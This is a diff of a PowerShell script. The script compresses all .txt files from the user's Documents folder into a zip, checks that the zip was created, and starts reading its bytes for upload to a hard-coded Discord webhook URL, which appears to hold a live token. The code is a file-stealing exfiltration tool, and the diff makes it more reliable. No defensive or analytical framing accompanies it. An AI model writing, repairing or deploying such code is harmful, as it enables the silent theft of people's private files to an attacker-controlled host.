@@ -5,11 +5,19 @@ $zipFilePath = "$documentsPath\txt_files.zip"
 # Discord webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"
 
-# Compress all .txt files into a zip file
+# Remove any existing zip file
 if (Test-Path $zipFilePath) {
     Remove-Item $zipFilePath -Force
 }
-Compress-Archive -Path "$documentsPath\*.txt" -DestinationPath $zipFilePath -Force
+
+# Compress all .txt files into a zip file
+Get-ChildItem -Path $documentsPath -Filter *.txt | Compress-Archive -DestinationPath $zipFilePath -Force
+
+# Check if the zip file was created
+if (-Not (Test-Path $zipFilePath)) {
+    Write-Error "Zip file was not created."
+    exit 1
+}
 
 # Prepare the file for upload
 $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
